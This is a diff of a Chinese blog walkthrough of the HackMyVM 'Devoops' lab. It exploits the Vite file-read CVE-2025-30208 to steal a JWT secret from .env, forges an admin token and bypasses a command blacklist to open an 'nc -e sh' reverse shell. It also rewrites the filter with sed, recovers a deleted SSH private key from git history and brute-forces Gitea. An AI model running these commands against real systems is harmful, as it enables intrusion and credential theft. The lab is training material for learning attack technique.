@@ -1,5 +1,4 @@
-<?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Pingsag3 Blog</title><link>https://pingsag3.github.io</link><description>萍水相逢，恰似温柔~</description><copyright>Pingsag3 Blog</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/212066009?s=48&amp;v=4</url><title>avatar</title><link>https://pingsag3.github.io</link></image><lastBuildDate>Fri, 30 May 2025 08:26:11 +0000</lastBuildDate><managingEditor>Pingsag3 Blog</managingEditor><ttl>60</ttl><webMaster>Pingsag3 Blog</webMaster><item><title>hackmyvm Devoops 测试记录</title><link>https://pingsag3.github.io/post/hackmyvm%20Devoops%20-ce-shi-ji-lu.html</link><description># hackmyvm_Devoops
+# hackmyvm_Devoops
 
  
 
@@ -60,35 +59,35 @@ PORT     STATE SERVICE VERSION
 |_    Connection: close
 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
 SF-Port3000-TCP:V=7.95%I=7%D=5/29%Time=68386C31%P=x86_64-pc-linux-gnu%r(Ge
-SF:tRequest,FE,'HTTP/1\.1\x20403\x20Forbidden\r\nVary:\x20Origin\r\nConten
+SF:tRequest,FE,"HTTP/1\.1\x20403\x20Forbidden\r\nVary:\x20Origin\r\nConten
 SF:t-Type:\x20text/plain\r\nDate:\x20Thu,\x2029\x20May\x202025\x2014:16:15
 SF:\x20GMT\r\nConnection:\x20close\r\n\r\nBlocked\x20request\.\x20This\x20
 SF:host\x20\(undefined\)\x20is\x20not\x20allowed\.\nTo\x20allow\x20this\x2
 SF:0host,\x20add\x20undefined\x20to\x20`server\.allowedHosts`\x20in\x20vit
-SF:e\.config\.js\.')%r(Help,1C,'HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n
-SF:')%r(NCP,1C,'HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n')%r(HTTPOptions
-SF:,D2,'HTTP/1\.1\x20204\x20No\x20Content\r\nVary:\x20Origin,\x20Access-Co
+SF:e\.config\.js\.")%r(Help,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n
+SF:")%r(NCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(HTTPOptions
+SF:,D2,"HTTP/1\.1\x20204\x20No\x20Content\r\nVary:\x20Origin,\x20Access-Co
 SF:ntrol-Request-Headers\r\nAccess-Control-Allow-Methods:\x20GET,HEAD,PUT,
 SF:PATCH,POST,DELETE\r\nContent-Length:\x200\r\nDate:\x20Thu,\x2029\x20May
-SF:\x202025\x2014:16:15\x20GMT\r\nConnection:\x20close\r\n\r\n')%r(RTSPReq
-SF:uest,D2,'HTTP/1\.1\x20204\x20No\x20Content\r\nVary:\x20Origin,\x20Acces
+SF:\x202025\x2014:16:15\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPReq
+SF:uest,D2,"HTTP/1\.1\x20204\x20No\x20Content\r\nVary:\x20Origin,\x20Acces
 SF:s-Control-Request-Headers\r\nAccess-Control-Allow-Methods:\x20GET,HEAD,
 SF:PUT,PATCH,POST,DELETE\r\nContent-Length:\x200\r\nDate:\x20Thu,\x2029\x2
-SF:0May\x202025\x2014:16:15\x20GMT\r\nConnection:\x20close\r\n\r\n')%r(RPC
-SF:Check,1C,'HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n')%r(DNSVersionBind
-SF:ReqTCP,1C,'HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n')%r(DNSStatusRequ
-SF:estTCP,1C,'HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n')%r(SSLSessionReq
-SF:,1C,'HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n')%r(TerminalServerCooki
-SF:e,1C,'HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n')%r(TLSSessionReq,1C,'
-SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n')%r(Kerberos,1C,'HTTP/1\.1\x
-SF:20400\x20Bad\x20Request\r\n\r\n')%r(SMBProgNeg,1C,'HTTP/1\.1\x20400\x20
-SF:Bad\x20Request\r\n\r\n')%r(X11Probe,1C,'HTTP/1\.1\x20400\x20Bad\x20Requ
-SF:est\r\n\r\n')%r(FourOhFourRequest,FE,'HTTP/1\.1\x20403\x20Forbidden\r\n
+SF:0May\x202025\x2014:16:15\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RPC
+SF:Check,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(DNSVersionBind
+SF:ReqTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(DNSStatusRequ
+SF:estTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(SSLSessionReq
+SF:,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TerminalServerCooki
+SF:e,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TLSSessionReq,1C,"
+SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(Kerberos,1C,"HTTP/1\.1\x
+SF:20400\x20Bad\x20Request\r\n\r\n")%r(SMBProgNeg,1C,"HTTP/1\.1\x20400\x20
+SF:Bad\x20Request\r\n\r\n")%r(X11Probe,1C,"HTTP/1\.1\x20400\x20Bad\x20Requ
+SF:est\r\n\r\n")%r(FourOhFourRequest,FE,"HTTP/1\.1\x20403\x20Forbidden\r\n
 SF:Vary:\x20Origin\r\nContent-Type:\x20text/plain\r\nDate:\x20Thu,\x2029\x
 SF:20May\x202025\x2014:16:15\x20GMT\r\nConnection:\x20close\r\n\r\nBlocked
 SF:\x20request\.\x20This\x20host\x20\(undefined\)\x20is\x20not\x20allowed\
 SF:.\nTo\x20allow\x20this\x20host,\x20add\x20undefined\x20to\x20`server\.a
-SF:llowedHosts`\x20in\x20vite\.config\.js\.');
+SF:llowedHosts`\x20in\x20vite\.config\.js\.");
 MAC Address: 08:00:27:B3:D9:97 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 ```
 
@@ -123,17 +122,17 @@ MAC Address: 08:00:27:B3:D9:97 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 
 ```
 └─# curl http://$IP:3000/sign
-{'status':'signed','data':'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiZ3Vlc3QiLCJpYXQiOjE3NDg1Mjg3NjIsImV4cCI6MTc0ODUzMDU2Mn0.F8hwKtxcpYq9Hgm0w-AoiZQT1sqb69kwMTN4l_768z0'}
+{"status":"signed","data":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiZ3Vlc3QiLCJpYXQiOjE3NDg1Mjg3NjIsImV4cCI6MTc0ODUzMDU2Mn0.F8hwKtxcpYq9Hgm0w-AoiZQT1sqb69kwMTN4l_768z0"}
 
 └─# curl http://$IP:3000/execute
-{'status':'rejected','data':'permission denied'}
+{"status":"rejected","data":"permission denied"}
 
 └─# curl http://$IP:3000/server.js
-import __vite__cjsImport0_express from '/node_modules/.vite/deps/express.js?v=8bc9628c'; const express = __vite__cjsImport0_express.__esModule ? __vite__cjsImport0_express.default : __vite__cjsImport0_express;
-import __vite__cjsImport1_jsonwebtoken from '/node_modules/.vite/deps/jsonwebtoken.js?v=8bc9628c'; const jwt = __vite__cjsImport1_jsonwebtoken.__esModule ? __vite__cjsImport1_jsonwebtoken.default : __vite__cjsImport1_jsonwebtoken;
-import '/node_modules/.vite/deps/dotenv_config.js?v=8bc9628c'
-import __vite__cjsImport3_child_process from '/@id/__vite-browser-external:child_process'; const exec = __vite__cjsImport3_child_process['exec'];
-import __vite__cjsImport4_util from '/@id/__vite-browser-external:util'; const promisify = __vite__cjsImport4_util['promisify'];
+import __vite__cjsImport0_express from "/node_modules/.vite/deps/express.js?v=8bc9628c"; const express = __vite__cjsImport0_express.__esModule ? __vite__cjsImport0_express.default : __vite__cjsImport0_express;
+import __vite__cjsImport1_jsonwebtoken from "/node_modules/.vite/deps/jsonwebtoken.js?v=8bc9628c"; const jwt = __vite__cjsImport1_jsonwebtoken.__esModule ? __vite__cjsImport1_jsonwebtoken.default : __vite__cjsImport1_jsonwebtoken;
+import "/node_modules/.vite/deps/dotenv_config.js?v=8bc9628c"
+import __vite__cjsImport3_child_process from "/@id/__vite-browser-external:child_process"; const exec = __vite__cjsImport3_child_process["exec"];
+import __vite__cjsImport4_util from "/@id/__vite-browser-external:util"; const promisify = __vite__cjsImport4_util["promisify"];
 
 const app = express();
 
@@ -144,8 +143,8 @@ const exec_promise = promisify(exec);
 
 const COMMAND_FILTER = process.env.COMMAND_FILTER
     ? process.env.COMMAND_FILTER.split(',')
-        .map(cmd =&gt; cmd.trim().toLowerCase())
-        .filter(cmd =&gt; cmd !== '')
+        .map(cmd => cmd.trim().toLowerCase())
+        .filter(cmd => cmd !== '')
     : [];
 
 app.use(express.json());
@@ -161,16 +160,16 @@ function is_safe_command(cmd) {
     const lower_cmd = cmd.toLowerCase();
 
     for (const forbidden of COMMAND_FILTER) {
-        const regex = new RegExp(`\\b${forbidden.replace(/[.*+?^${}()|[\]\\]/g, '\\$&amp;')}\\b|^${forbidden.replace(/[.*+?^${}()|[\]\\]/g, '\\$&amp;')}$`, 'i');
+        const regex = new RegExp(`\\b${forbidden.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\b|^${forbidden.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i');
         if (regex.test(lower_cmd)) {
             return false;
         }
     }
 
-    if (/[;&amp;|]/.test(cmd)) {
+    if (/[;&|]/.test(cmd)) {
         return false;
     }
-    if (/[&lt;&gt;]/.test(cmd)) {
+    if (/[<>]/.test(cmd)) {
         return false;
     }
     if (/[`$()]/.test(cmd)) {
@@ -193,14 +192,14 @@ async function execute_command_sync(command) {
     }
 }
 
-app.get('/', (req, res) =&gt; {
+app.get('/', (req, res) => {
     return res.json({
         'status': 'working',
         'data': `listening on http://${address}:${port}`
     })
 })
 
-app.get('/api/sign', (req, res) =&gt; {
+app.get('/api/sign', (req, res) => {
     return res.json({
         'status': 'signed',
         'data': jwt.sign({
@@ -210,7 +209,7 @@ app.get('/api/sign', (req, res) =&gt; {
     });
 });
 
-app.get('/api/execute', async (req, res) =&gt; {
+app.get('/api/execute', async (req, res) => {
     const authorization_header_raw = req.headers['authorization'];
     if (!authorization_header_raw || !authorization_header_raw.startsWith('Bearer ')) {
         return res.status(401).json({
@@ -254,7 +253,7 @@ app.get('/api/execute', async (req, res) =&gt; {
     })
 });
 
-app.listen(port, address, () =&gt; {
+app.listen(port, address, () => {
     console.log(`Listening on http://${address}:${port}`)
 });
 
@@ -269,14 +268,14 @@ app.listen(port, address, () =&gt; {
 
 ```shell
 #https://jwt.io/
-{'status':'signed','data':'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiZ3Vlc3QiLCJpYXQiOjE3NDg1Mjg3NjIsImV4cCI6MTc0ODUzMDU2Mn0.F8hwKtxcpYq9Hgm0w-AoiZQT1sqb69kwMTN4l_768z0'}
+{"status":"signed","data":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiZ3Vlc3QiLCJpYXQiOjE3NDg1Mjg3NjIsImV4cCI6MTc0ODUzMDU2Mn0.F8hwKtxcpYq9Hgm0w-AoiZQT1sqb69kwMTN4l_768z0"}
 
 ---
 {
-  'uid': -1,
-  'role': 'guest',
-  'iat': 1748528762,
-  'exp': 1748530562
+  "uid": -1,
+  "role": "guest",
+  "iat": 1748528762,
+  "exp": 1748530562
 }
 ```
 
@@ -288,65 +287,504 @@ app.listen(port, address, () =&gt; {
 
 ![image-20250529225043847](https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529225043847.png)
 
-`secret`是从 `process.env.JWT_SECRET `获取的。</description><guid isPermaLink="true">https://pingsag3.github.io/post/hackmyvm%20Devoops%20-ce-shi-ji-lu.html</guid><pubDate>Fri, 30 May 2025 08:25:41 +0000</pubDate></item><item><title>hackmyvm homelab 测试记录</title><link>https://pingsag3.github.io/post/hackmyvm%20homelab%20-ce-shi-ji-lu.html</link><description># hackmyvm homelab 测试记录
+`secret`是从 `process.env.JWT_SECRET `获取的。也就是 `dotenv`,尝试读取 `.env `文件
 
- 
+![image-20250529225506429](https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529225506429.png)
 
+并不能读取 `.env `文件，从报错中可以得知项目路径在`/opt/node`下
+这里就需要用到 `CVE `了
+页面上有 `3` 处提示
+服务是使用 `Vite` 运行的
+初始化项目时标注了` Vite `的版本
 
-[大佬WP](https://www.bilibili.com/video/BV1gN5WzMEB5)
+![image-20250529225656145](https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529225656145.png)
 
-
-
-
-### 1. 基本信息
-
-```
-靶机链接：
-https://hackmyvm.eu/machines/machine.php?vm=Homelab
-https://maze-sec.com/library/
-```
+底部标注了页面修改的时间
 
 ```shell
-难度：⭐️⭐️⭐️
-知识点：扫描，`bypass-403`工具，爆破`PKCS#8`密码，`openvpn`使用，家目录文件提权
+@20206675 - Last modified 2025-02-26
 ```
 
-### 2. 信息收集
 
-### Nmap
+
+### POC：Vite[CVE-2025-30208]
+
+根据 `Vite` 的 `release note`，这个日期距离 `6.2.0 `版本最近
+
+搜索` Vite 6.2.0`，也可以找到 `CVE-2025-30208`任意文件读取漏洞
+
+相关`POC`[[4m3rr0r/CVE-2025-30208-PoC: CVE-2025-30208 - Vite Arbitrary File Read PoC](https://github.com/4m3rr0r/CVE-2025-30208-PoC)](https://github.com/4m3rr0r/CVE-2025-30208-PoC)
+
+其实也不用`python`脚本，直接`curl`就行了
+
+具体利用就是在url的文件路径后添加`?raw??`或者`?import&raw??`实现绕过
+
+尝试读取`.env`中的`JWT_SECRE`变量
 
 ```shell
-└─# arp-scan -l | grep PCS
-192.168.31.65   82:76:60:93:03:34       (Unknown: locally administered)
-└─# IP=192.168.31.65
-└─# nmap -sV -sC -A $IP -Pn
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-14 19:16 CST
-Nmap scan report for homelab (192.168.31.65)
-Host is up (0.0017s latency).
-Not shown: 999 closed tcp ports (reset)
-PORT   STATE SERVICE VERSION
-80/tcp open  http    Apache httpd 2.4.62 ((Unix))
-|_http-title: Mac OS X Server
-| http-methods:
-|_  Potentially risky methods: TRACE
-|_http-server-header: Apache/2.4.62 (Unix)
-|_http-favicon: Apache on Mac OS X
-MAC Address: 82:76:60:93:03:34 (Unknown)
+└─# curl "http://$IP:3000/@fs/opt/node/.env?raw??"
+export default "JWT_SECRET='2942szKG7Ev83aDviugAa6rFpKixZzZz'\nCOMMAND_FILTER='nc,python,python3,py,py3,bash,sh,ash,|,&,<,>,ls,cat,pwd,head,tail,grep,xxd'\n"
+//# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIi5lbnY/cmF3PyJdLCJzb3VyY2VzQ29udGVudCI6WyJleHBvcnQgZGVmYXVsdCBcIkpXVF9TRUNSRVQ9JzI5NDJzektHN0V2ODNhRHZpdWdBYTZyRnBLaXhaelp6J1xcbkNPTU1BTkRfRklMVEVSPSduYyxweXRob24scHl0aG9uMyxweSxweTMsYmFzaCxzaCxhc2gsfCwmLDwsPixscyxjYXQscHdkLGhlYWQsdGFpbCxncmVwLHh4ZCdcXG5cIiJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQSxNQUFNLENBQUMsT0FBTyxDQUFDLENBQUMsVUFBVSxDQUFDLENBQUMsZ0NBQWdDLENBQUMsQ0FBQyxlQUFlLENBQUMsQ0FBQyxFQUFFLENBQUMsTUFBTSxDQUFDLE9BQU8sQ0FBQyxFQUFFLENBQUMsR0FBRyxDQUFDLElBQUksQ0FBQyxFQUFFLENBQUMsR0FBRyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxFQUFFLENBQUMsR0FBRyxDQUFDLEdBQUcsQ0FBQyxJQUFJLENBQUMsSUFBSSxDQUFDLElBQUksQ0FBQyxHQUFHLENBQUMsQ0FBQyxDQUFDIn0=
 ```
 
-### 目录扫描
+获得`JWT_SECRE='2942szKG7Ev83aDviugAa6rFpKixZzZz'`，同时还有 `COMMAND_FILTER`，是对 `/execute `命令执行的过滤
+
+### 获得`runner`权限
+
+先使用 `secret` 生成新的 `jwt`
+
+![image-20250529231800529](https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529231800529.png)
 
 ```shell
-└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP -x.txt,.php,.h
-└─# dirsearch -u http://$IP  -x 403 -e txt,php,html
-[19:19:13] 200 -  820B  - /cgi-bin/printenv
-[19:19:13] 200 -    1KB - /cgi-bin/test-cgi
-[19:19:15] 200 -    4KB - /error.html
-[19:19:15] 200 -    8KB - /favicon.ico
-[19:19:22] 301 -  313B  - /script  -&gt;  http://192.168.31.65/script/
-[19:19:22] 301 -  319B  - /service?Wsdl  -&gt;  http://192.168.31.65/service/?Wsdl
-[19:19:22] 301 -  314B  - /service  -&gt;  http://192.168.31.65/service/
-[19:19:23] 301 -  312B  - /style  -&gt;  http://192.168.31.65/style/
+#注意# `curl http://$IP:3000/sign`拿的`jwt`存在有效期，过期了需重新请求
+#载荷/Payload
+{
+    "uid": -1,
+    "role": "admin",
+    "iat": 1748533467,
+    "exp": 1748535267
+}
+JWT_SECRE='2942szKG7Ev83aDviugAa6rFpKixZzZz'
+---
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NDg1MzM0NjcsImV4cCI6MTc0ODUzNTI2N30.VBQ8TkwXkfVv8M9NO-vNr5glCBVdCfRAXrj0wj_t984
+#也可以用厨子，菜谱如下
+#recipe=JWT_Sign('2942szKG7Ev83aDviugAa6rFpKixZzZz','HS256')
 ```
 
-看群主`wp`介绍`style是css`，`script是js`，所以入口点就是`service`。</description><guid isPermaLink="true">https://pingsag3.github.io/post/hackmyvm%20homelab%20-ce-shi-ji-lu.html</guid><pubDate>Sat, 17 May 2025 01:33:20 +0000</pubDate></item></channel></rss>
+带上 `Authorization `头访问，返回值发生变化
+
+```shell
+└─# curl -s -H 'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NDg1MzM0NjcsImV4cCI6MTc0ODUzNTI2N30.VBQ8TkwXkfVv8M9NO-vNr5glCBVdCfRAXrj0wj_t984' "http://$IP:3000/execute/"
+{"status":"rejected","data":"this command is unsafe"}
+```
+
+在` server.js `中可以发现，命令来自 `req.query.cmd`，在请求中加上参数`` cmd``
+
+```shell
+└─# curl -s -H 'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NDg1MzM0NjcsImV4cCI6MTc0ODUzNTI2N30.VBQ8TkwXkfVv8M9NO-vNr5glCBVdCfRAXrj0wj_t984' "http://$IP:3000/execute/?cmd=id"
+{"status":"executed","data":{"stdout":"uid=1000(runner) gid=1000(runner) groups=1000(runner)\n","stderr":""}}
+```
+
+成功执行了命令
+之前看见的命令过滤黑名单是
+
+```shell
+└─# curl "http://$IP:3000/@fs/opt/node/.env?raw??"
+COMMAND_FILTER='nc,python,python3,py,py3,bash,sh,ash,|,&,<,>,ls,cat,pwd,head,tail,grep,xxd'
+```
+
+简单的绕过黑名单关键字加双引号，空格用+
+
+```shell
+└─# curl -s -H 'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NDg1MzM0NjcsImV4cCI6MTc0ODUzNTI2N30.VBQ8TkwXkfVv8M9NO-vNr5glCBVdCfRAXrj0wj_t984' 'http://192.168.31.25:3000/execute/?cmd=
+n""c+192.168.31.126+1234+-e+s""h'
+
+└─# nc -lvp 1234
+listening on [any] 1234 ...
+id
+connect to [192.168.31.126] from devoops [192.168.31.25] 41285
+uid=1000(runner) gid=1000(runner) groups=1000(runner)
+```
+
+##### 出题者预期解
+
+预期解法是构造 `payload`，修改` COMMAND_FILTER `的内容
+但不能修改为空，会导致任何命令都不能执行
+
+```shell
+function is_safe_command(cmd) {
+if (!cmd || typeof cmd !== 'string') {
+return false;
+}
+if (COMMAND_FILTER.length === 0) {
+return false;
+}
+}
+```
+
+因为并没有过滤 `sed` 命令，可以尝试这个 `payload`
+
+```shell
+http://$IP:3000/execute?cmd=sed -i
+'s/COMMAND_FILTER%3D.*/COMMAND_FILTER%3D"a"/' .env
+```
+
+执行后没有错误产生
+
+![image-20250529231800529](hackmyvm_Devoops.assets/image-202505292318005.png)
+
+现在再尝试使用黑名单中的命令，或者直接使用` CVE` 读取 `.env`
+
+![image-20250529231800529](hackmyvm_Devoops.assets/image-202505292318005.png)
+
+发现过滤清单已经被修改
+现在就可以随意执行命令了，例如反弹` shell`
+
+```shell
+nc 192.168.31.126 1234 -e sh
+```
+
+
+
+### `Gitea`服务
+
+查看本地用户
+
+```shell
+cat /etc/passwd
+runner:x:1000:1000:::/bin/sh
+hana:x:1001:100::/home/hana:/bin/sh
+gitea:x:102:82:gitea:/var/lib/gitea:/bin/sh
+cd /home
+ls -artl
+total 12
+drwxr-xr-x   21 root     root          4096 Apr 21 10:29 ..
+drwxr-xr-x    3 root     root          4096 Apr 21 12:09 .
+drwx------    3 hana     users         4096 Apr 21 14:30 hana
+```
+
+得到三个用户`runner` `hana` `gitea`,既然有个`gitea`用户，那必然有部署了`gitea`服务
+
+查看端口开放，本地开放`3002`端口
+
+```shell
+netstat -nltp
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:3002          0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:3000            0.0.0.0:*               LISTEN      2659/node
+tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      -
+tcp6       0      0 ::1:3001                :::*                    LISTEN      2664/node
+```
+
+还发现了` 22` 和 `3002` 端口
+没有用户密码和私钥，暂时没有办法利用 `22 `端口。先看` 3002` 端口
+因为并没有显示进程名，所以使用 `ps `命令看一下本地运行的进程
+
+```shell
+#ps aux
+ 2492 root      0:00 supervise-daemon gitea --start --pidfile /run/gitea.pid --respawn-delay 2 --respawn-max 5 --respawn-period 1800 --capabilities ^cap_net_bind_service --user gitea --env GITEA_WORK_DIR=/var/lib/gitea --chdir /var/lib/gitea --stdout /var/log/gitea/http.log --stderr /var/log/gitea/http.log /usr/bin/gitea -- web --config /etc/gitea/app.ini
+```
+
+发现 `Gitea` 服务
+
+##### 解法1
+
+同时，在 `/opt `目录下发现 `gitea `目录
+
+```shell
+cd /opt
+ls -artl
+total 16
+drwxr-xr-x   21 root     root          4096 Apr 21 10:29 ..
+drwxrwx---    6 root     runner        4096 Apr 21 11:38 node
+drwxr-xr-x    4 root     root          4096 Apr 21 13:41 .
+drwxr-xr-x    5 gitea    root          4096 Apr 21 13:52 gitea
+```
+
+任意用户对` /opt/gitea `具有读取权限
+可以直接查看 Gitea 的配置文件，找到 Git 仓库的存储路径在 /etc/gitea/app.ini(其实ps就有这个信息)
+
+```shell
+#cat /etc/gitea/app.ini
+.....
+
+[repository]
+ROOT = /opt/gitea/git
+SCRIPT_TYPE = sh
+```
+
+得到仓库地址为`/opt/gitea/git`
+
+```shell
+cd /opt/gitea/git
+ls -artl
+total 12
+drwxr-xr-x    5 gitea    root          4096 Apr 21 13:52 ..
+drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:22 .
+drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:35 hana
+pwd
+/opt/gitea/git
+cd hana
+ls -artl
+total 12
+drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:22 ..
+drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:35 .
+drwxr-xr-x    8 gitea    www-data      4096 Apr 21 14:36 node.git
+cd node.git
+ls -artl
+total 44
+drwxr-xr-x    4 gitea    www-data      4096 Apr 21 14:35 refs
+drwxr-xr-x    6 gitea    www-data      4096 Apr 21 14:35 hooks
+-rw-r--r--    1 gitea    www-data        73 Apr 21 14:35 description
+-rw-r--r--    1 gitea    www-data        66 Apr 21 14:35 config
+drwxr-xr-x    2 gitea    www-data      4096 Apr 21 14:35 branches
+-rw-r--r--    1 gitea    www-data        21 Apr 21 14:35 HEAD
+drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:35 ..
+drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:35 logs
+drwxr-xr-x   24 gitea    www-data      4096 Apr 21 14:36 objects
+drwxr-xr-x    2 gitea    www-data      4096 Apr 21 14:36 info
+drwxr-xr-x    8 gitea    www-data      4096 Apr 21 14:36 .
+```
+
+此处暴露了 2 个信息
+
+并且在`opt/gitea/git`下存在文件夹`hana`，和 `Linux `操作系统用户相对应
+
+发现在`node.git`文件夹下存在`.git`相关目录文件，只不过文件名不是`.git`
+同时，靶机内也有` git` 命令可用
+
+```shell
+which git
+/usr/bin/git
+```
+
+将` Git` 目录拷贝到 `/tmp `目录
+
+```shell
+mkdir /tmp/repo
+pwd
+/opt/gitea/git/hana/node.git
+cd ..
+pwd
+/opt/gitea/git/hana
+cp -r ./node.git/ /tmp/repo/.git
+```
+
+修改文件名，查看`git log`，查看` commit` 日志
+
+```shell
+git log
+commit 1994a70bbd080c633ac85a339fd85a8635c63893
+Author: azwhikaru <37921907+azwhikaru@users.noreply.github.com>
+Date:   Mon Apr 21 14:36:12 2025 +0800
+
+    del: oops!
+
+commit 02c0f912f6e5b09616580d960f3e5ee33b06084a
+Author: azwhikaru <37921907+azwhikaru@users.noreply.github.com>
+Date:   Mon Apr 21 14:34:37 2025 +0800
+
+    init: init commit
+pwd
+/tmp/repo/.git
+```
+
+发现一个删除提交`del: oops!`,查看这个` commit`
+
+```shell
+git show 1994a70bbd080c633ac85a339fd85a8635c63893
+commit 1994a70bbd080c633ac85a339fd85a8635c63893
+Author: azwhikaru <37921907+azwhikaru@users.noreply.github.com>
+Date:   Mon Apr 21 14:36:12 2025 +0800
+
+    del: oops!
+
+diff --git a/id_ed25519 b/id_ed25519
+deleted file mode 100644
+index a2626a4..0000000
+--- a/id_ed25519
++++ /dev/null
+@@ -1,7 +0,0 @@
+------BEGIN OPENSSH PRIVATE KEY-----
+-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+-QyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrgAAAJgA8k3lAPJN
+-5QAAAAtzc2gtZWQyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrg
+-AAAEBX7jUWSgQUQgA8z8yL85Eg1WiSgijSu3C4x8TVF/G3uIwHnERzoDYjr3CHJkNxNI8Z
+-WzPaOK+7OIcARdoCUkuuAAAAEGhhbmFAZGV2b29wcy5obXYBAgMEBQ==
+------END OPENSSH PRIVATE KEY-----
+```
+
+获得` SSH `私钥(注意：私钥每行开头多了个`-`)
+
+##### 解法2
+
+靶机的 `Gitea `服务是有 `Web` 的，使用靶机内预留了` socat`端口转发工具,将` 127.0.0.1:3002` 转发到外网地址即可访问
+
+```shell
+kali└─# tldr socat
+   sudo socat TCP-LISTEN:80,fork TCP4:www.example.com:80
+#socat TCP-LISTEN:3020,fork TCP4:127.0.0.1:3002&
+```
+
+访问` Web `之后，自然是爆破用户名和密码,用户名就是靶机内唯一的正常 用户` hana`
+
+```shell
+出题者在制作靶机的时候，`Gitea` 先是监听在0.0.0.0，没有经过`socat`
+`hydra`爆破速度非常快，即使是`rockyou`也能在 ~30 秒内找到密码
+但是经过`socat`之后爆破效率变得很低
+```
+
+最后爆破得到密码 `saki`
+进入 `Gitea` 后，查看唯一的仓库的 `commit `记录
+
+![image-20250529231800529](hackmyvm_Devoops.assets/image-202505292318005.png)
+
+同样可以获得 `SSH`私钥
+
+### 获得`hana`权限
+
+之前查看监听的端口时，发现 `SSH` 也监听在` 127.0.0.1`
+
+```shell
+#netstat -anlptu
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:3002          0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:3000            0.0.0.0:*               LISTEN      2659/node
+tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      -
+tcp        0     54 192.168.31.25:40561     192.168.31.126:1234     ESTABLISHED 2731/sh
+tcp        0      0 192.168.31.25:3000      192.168.31.126:56472    ESTABLISHED 2659/node
+tcp6       0      0 ::1:3001                :::*                    LISTEN      2664/node
+tcp6       0      0 ::1:3001                ::1:35602               ESTABLISHED 2664/node
+tcp6       0      0 ::1:35602               ::1:3001                ESTABLISHED 2659/node
+```
+
+#####  `socat `端口转发
+
